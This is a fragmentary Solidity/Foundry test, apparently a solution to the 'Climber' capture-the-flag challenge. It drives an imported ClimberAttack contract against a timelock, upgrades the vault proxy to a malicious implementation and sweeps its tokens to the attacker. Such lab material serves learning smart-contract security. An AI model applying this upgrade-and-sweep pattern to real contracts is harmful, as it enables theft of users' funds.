...
import "attacks/ClimberAttack.sol";
...
contract Climber is Test {
  ...
  climberTimelock = ClimberTimelock(
    payable(
      ClimberVault(address(climberVaultProxy)).owner()
  )
  );
  ...
  function testExploit() public {
    ...
    ClimberVault vault = ClimberVault(address(climberVaultProxy));

    ClimberAttack atk = new ClimberAttack(address(climberTimelock), address(climberVaultProxy));
    atk.execute();

    ClimberVaultUpgrade upgrade = new ClimberVaultUpgrade();

    vm.prank(address(atk));
    vault.upgradeTo(address(upgrade));

    vm.prank(attacker);
    ClimberVaultUpgrade(address(climberVaultProxy)).sweep(address(dvt));
